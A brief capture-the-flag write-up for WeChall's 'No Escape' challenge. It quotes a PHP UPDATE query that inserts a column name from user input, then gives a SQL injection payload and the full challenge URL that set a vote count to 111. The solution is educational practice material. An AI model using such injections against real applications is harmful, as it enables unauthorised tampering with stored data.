according to the problem you can't just click vote button for 111 times to solve it. you need to set the value directly to do it.

we see line 72:
```
$query = "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1";
```

if we do ``bill`=111#`` we see an error, we need to continue the SQL statement. add ``,`george`=`george` `` and done

answer: http://www.wechall.net/challenge/no_escape/index.php?vote_for=bill`=111,`george`=`george
